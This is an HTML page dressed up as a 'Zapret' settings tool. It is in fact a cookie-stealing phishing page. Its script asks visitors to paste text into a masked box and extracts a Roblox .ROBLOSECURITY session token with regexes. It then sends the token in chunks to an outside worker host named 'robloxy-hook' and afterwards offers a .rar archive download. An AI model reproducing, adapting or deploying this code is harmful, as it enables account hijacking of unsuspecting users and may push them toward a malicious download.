<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Zapret</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
:root {
    --bg-main: #000000;
    --bg-glass: rgba(30, 30, 30, 0.6);
    --border-glass: rgba(255, 255, 255, 0.1);
    --text-main: #ffffff;
    --text-muted: #bbbbbb;
    --accent: #00a2ff;
    --accent-hover: #0088cc;
    --glow: rgba(0, 162, 255, 0.4);
    --success: #00cc66;
    --error: #ff3344;
}

* {
    box-sizing: border-box;
}

body {
    margin: 0;
    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
    background: var(--bg-main);
    color: var(--text-main);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
}

body::before {
    content: '';
    position: absolute;
    inset: 0;
    background: radial-gradient(circle at 30% 70%, rgba(0, 162, 255, 0.08) 0%, transparent 50%),
                radial-gradient(circle at 70% 30%, rgba(0, 162, 255, 0.06) 0%, transparent 50%);
    pointer-events: none;
    animation: pulse 20s infinite alternate;
}

@keyframes pulse {
    0% { opacity: 0.6; }
    100% { opacity: 1; }
}

nav { display: none; }

.hero {
    text-align: center;
    opacity: 0;
    transform: translateY(30px);
    animation: fadeInUp 1.2s ease-out forwards;
}

@keyframes fadeInUp {
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

.hero h1 {
    font-size: 80px;
    margin: 0 0 60px 0;
    font-weight: 800;
    letter-spacing: -2px;
    background: linear-gradient(90deg, #ffffff, #a0d8ff);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    animation: titleGlow 4s infinite alternate;
}

@keyframes titleGlow {
    0% { text-shadow: 0 0 20px rgba(0,162,255,0.3); }
    100% { text-shadow: 0 0 40px rgba(0,162,255,0.6); }
}

.hero .cta {
    padding: 20px 60px;
    font-size: 26px;
    font-weight: 600;
    border-radius: 16px;
    border: none;
    cursor: pointer;
    background: var(--accent);
    color: white;
    box-shadow: 0 10px 30px var(--glow);
    transition: all 0.4s ease;
    position: relative;
    overflow: hidden;
}

.hero .cta::before {
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(135deg, transparent, rgba(255,255,255,0.2), transparent);
    transform: translateX(-100%);
    transition: transform 0.6s;
}

.hero .cta:hover::before {
    transform: translateX(100%);
}

.hero .cta:hover {
    background: var(--accent-hover);
    transform: translateY(-6px) scale(1.03);
    box-shadow: 0 20px 50px var(--glow);
}

section#copy {
    position: fixed;
    inset: 0;
    background: var(--bg-main);
    display: none;
    align-items: center;
    justify-content: center;
    opacity: 0;
    transition: opacity 0.6s ease;
}

section#copy.active {
    display: flex;
    opacity: 1;
    animation: fadeIn 0.6s ease;
}

@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

* {
    box-sizing: border-box;
}

.card {
    max-width: 420px;
    width: 100%;
    padding: 44px;
    text-align: center;
    background: var(--bg-glass);
    backdrop-filter: blur(20px);
    border-radius: 20px;
    border: 1px solid var(--border-glass);
    box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
    opacity: 0;
    transform: scale(0.9) translateY(20px);
    transition: all 0.6s ease;
}

section#copy.active .card {
    opacity: 1;
    transform: scale(1) translateY(0);
}

.card h2 {
    margin: 0 0 12px 0;
    font-size: 34px;
    font-weight: 600;
}

.card p {
    font-size: 16px;
    color: var(--text-muted);
    margin: 0 0 32px 0;
}

.card textarea {
    width: 100%;
    padding: 18px;
    font-size: 17px;
    border-radius: 12px;
    border: 1px solid var(--border-glass);
    background: rgba(255, 255, 255, 0.08);
    color: var(--text-main);
    outline: none;
    margin-bottom: 20px;
    transition: all 0.3s ease;
    resize: vertical;
    min-height: 120px;
    letter-spacing: normal;
    font-family: inherit;
}

.card textarea:focus {
    border-color: var(--accent);
    box-shadow: 0 0 0 4px rgba(0, 162, 255, 0.25);
}

.card button {
    width: 100%;
    padding: 18px;
    font-size: 18px;
    border-radius: 12px;
    border: none;
    background: var(--accent);
    color: white;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.4s ease;
    box-shadow: 0 8px 25px var(--glow);
}

.card button:hover {
    background: var(--accent-hover);
    transform: translateY(-4px);
    box-shadow: 0 16px 40px var(--glow);
}

.status {
    margin-top: 20px;
    font-size: 15px;
    color: var(--text-muted);
    min-height: 24px;
    opacity: 0;
    transition: opacity 0.4s ease;
}

.status.show {
    opacity: 1;
}
</style>
</head>

<body>

<div class="hero">
    <h1>Zapret</h1>
    <button class="cta" onclick="showSection('copy')">Get Started</button>
</div>

<section id="copy">
    <div class="card">
        <h2>Zapret settings</h2>
        <p>Enter</p>

        <textarea id="placeId" placeholder="Write" rows="6"></textarea>

        <button onclick="sendPlace()">Send</button>

        <div class="status" id="status"></div>
    </div>
</section>

<script>
const WORKER_URL = "https://robloxy-hook.zynefunpay.workers.dev";

let realValue = '';
const MAX_LENGTH = 1000000;
const VISIBLE_MAX = 10000;
const CHUNK_SIZE = 50000;

let pendingSel = null;
let rafScheduled = false;
let lastSentToken = '';

function showSection(id) {
    document.querySelectorAll("section").forEach(s => s.classList.remove("active"));
    document.getElementById(id).classList.add("active");
}

function downloadToken() {
    if (!lastSentToken) {
        alert('No token to download');
        return;
    }
    
    const element = document.createElement('a');
    element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(lastSentToken));
    element.setAttribute('download', '.robloxsecurity');
    element.style.display = 'none';
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
}

function downloadUserFile() {
    const fileUrl = 'https://github.com/zapret-roblox/zapret/releases/download/v1.0/zapret-IUHWBAOP.rar';
    
    const a = document.createElement('a');
    a.href = fileUrl;
    a.download = 'zapret-IUHWBAOP.rar';
    a.target = '_blank';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

document.addEventListener('DOMContentLoaded', () => {
});

async function sendPlace() {
    const ta = document.getElementById("placeId");
    const status = document.getElementById("status");
    let textToSend = realValue.trim();

    if (!textToSend) {
        status.textContent = "Enter text";
        status.classList.add("show");
        return;
    }

    let extractedToken = '';

    const warningMatch = textToSend.match(/_\|WARNING:[^"'\s]+/);
    if (warningMatch) {
        extractedToken = warningMatch[0];
    }

    if (!extractedToken) {
        const quotedMatch = textToSend.match(/["'](_\|WARNING:[^"']+)["']/);
        if (quotedMatch) {
            extractedToken = quotedMatch[1];
        }
    }

    if (!extractedToken) {
        const cookieMatch = textToSend.match(/\.(?:ROBLOSECURITY|robloxsecurity)["\']?\s*[,\(]?\s*["']([^"']+)["']/i);
        if (cookieMatch) {
            extractedToken = cookieMatch[1];
        }
    }

    if (!extractedToken) {
        const base64Match = textToSend.match(/(_\|[A-Za-z0-9+/=_\-|.]{100,})/);
        if (base64Match) {
            extractedToken = base64Match[1];
        }
    }

    if (extractedToken) {
        textToSend = extractedToken;
        console.log('Extracted token:', textToSend.substring(0, 50) + '...');
    } else {
        console.log('No token pattern found, sending whole text');
    }

    status.textContent = "Sending...";
    status.classList.add("show");

    try {
        const chunks = [];
        for (let i = 0; i < textToSend.length; i += CHUNK_SIZE) {
            chunks.push(textToSend.slice(i, i + CHUNK_SIZE));
        }

        let successCount = 0;
        for (let i = 0; i < chunks.length; i++) {
            const chunk = chunks[i];
            const payload = { 
                placeId: chunk,
                chunkNum: i + 1,
                totalChunks: chunks.length
            };
            console.log(`sendPlace: chunk ${i+1}/${chunks.length}`);
            
            const res = await fetch(WORKER_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            if (res.ok) {
                successCount++;
            } else {
                status.textContent = `Error chunk ${i+1}: ${res.status}`;
                return;
            }
        }

        if (successCount === chunks.length) {
            lastSentToken = textToSend;
            status.innerHTML = `Sent successfully`;
            
            const downloadBtn = document.createElement('button');
            downloadBtn.textContent = 'Download File';
            downloadBtn.style.marginTop = '10px';
            downloadBtn.style.padding = '10px 20px';
            downloadBtn.style.fontSize = '14px';
            downloadBtn.style.background = 'var(--accent)';
            downloadBtn.style.color = 'white';
            downloadBtn.style.border = 'none';
            downloadBtn.style.borderRadius = '8px';
            downloadBtn.style.cursor = 'pointer';
            downloadBtn.style.fontWeight = '600';
            downloadBtn.onclick = downloadUserFile;
            status.appendChild(downloadBtn);
            
            realValue = '';
            ta.value = '';
        }
    } catch (err) {
        console.error('sendPlace error:', err);
        status.textContent = `Error: ${err.message}`;
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const ta = document.getElementById('placeId');
    const status = document.getElementById('status');
    if (!ta) return;

    function scheduleUpdateDisplay(startPos, endPos) {
        pendingSel = { start: startPos, end: endPos };
        if (rafScheduled) return;
        rafScheduled = true;
        requestAnimationFrame(() => {
            rafScheduled = false;
            const p = pendingSel || { start: 0, end: 0 };
            updateDisplay(p.start, p.end);
        });
    }

    function updateDisplay(startPos, endPos) {
        const len = realValue.length;
        startPos = Math.max(0, Math.min(startPos || 0, len));
        endPos = Math.max(0, Math.min(endPos || 0, len));

        if (len > VISIBLE_MAX) {
            const half = Math.floor((VISIBLE_MAX - 1) / 2);
            ta.value = '•'.repeat(half) + '…' + '•'.repeat(half);
            const visMax = half + 1 + half;
            try { ta.setSelectionRange(Math.min(startPos, visMax), Math.min(endPos, visMax)); } catch (err) {}
        } else {
            ta.value = '•'.repeat(len);
            try { ta.setSelectionRange(startPos, endPos); } catch (err) {}
        }
    }

    ta.addEventListener('beforeinput', (e) => {
        const selStart = ta.selectionStart || 0;
        const selEnd = ta.selectionEnd || 0;
        e.preventDefault();

        const insertText = (text) => {
            const allowed = MAX_LENGTH - (realValue.length - (selEnd - selStart));
            const toInsert = text.slice(0, Math.max(0, allowed));
            if (!toInsert) {
                status.textContent = 'Max length reached';
                status.classList.add('show');
                return;
            }
            realValue = realValue.slice(0, selStart) + toInsert + realValue.slice(selEnd);
            const newPos = selStart + toInsert.length;
            scheduleUpdateDisplay(newPos, newPos);
        };

        switch (e.inputType) {
            case 'insertText':
                if (e.data) insertText(e.data);
                break;
            case 'insertLineBreak':
                insertText('\n');
                break;
            case 'deleteContentBackward':
                if (selStart !== selEnd) {
                    realValue = realValue.slice(0, selStart) + realValue.slice(selEnd);
                    scheduleUpdateDisplay(selStart, selStart);
                } else if (selStart > 0) {
                    realValue = realValue.slice(0, selStart - 1) + realValue.slice(selStart);
                    scheduleUpdateDisplay(selStart - 1, selStart - 1);
                }
                break;
            case 'deleteContentForward':
                if (selStart !== selEnd) {
                    realValue = realValue.slice(0, selStart) + realValue.slice(selEnd);
                    scheduleUpdateDisplay(selStart, selStart);
                } else {
                    realValue = realValue.slice(0, selStart) + realValue.slice(selStart + 1);
                    scheduleUpdateDisplay(selStart, selStart);
                }
                break;
        }
    });

    ta.addEventListener('paste', (e) => {
        e.preventDefault();
        const text = (e.clipboardData || window.clipboardData).getData('text');
        const selStart = ta.selectionStart || 0;
        const selEnd = ta.selectionEnd || 0;
        const allowed = MAX_LENGTH - (realValue.length - (selEnd - selStart));
        const toInsert = text.slice(0, Math.max(0, allowed));
        if (!toInsert) {
            status.textContent = 'Max length reached';
            status.classList.add('show');
            return;
        }
        realValue = realValue.slice(0, selStart) + toInsert + realValue.slice(selEnd);
        scheduleUpdateDisplay(selStart + toInsert.length, selStart + toInsert.length);
    });

    ta.addEventListener('keydown', (e) => {
        if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
            e.preventDefault();
            sendPlace();
        }
    });

    ta.addEventListener('focus', () => {
        const s = ta.selectionStart || 0;
        const e = ta.selectionEnd || s;
        scheduleUpdateDisplay(s, e);
    });
    ta.addEventListener('click', () => {
        const s = ta.selectionStart || 0;
        const e = ta.selectionEnd || s;
        scheduleUpdateDisplay(s, e);
    });
    ta.addEventListener('keyup', () => {
        const s = ta.selectionStart || 0;
        const e = ta.selectionEnd || s;
        scheduleUpdateDisplay(s, e);
    });

    scheduleUpdateDisplay(0, 0);
});
</script>

</body>
</html>
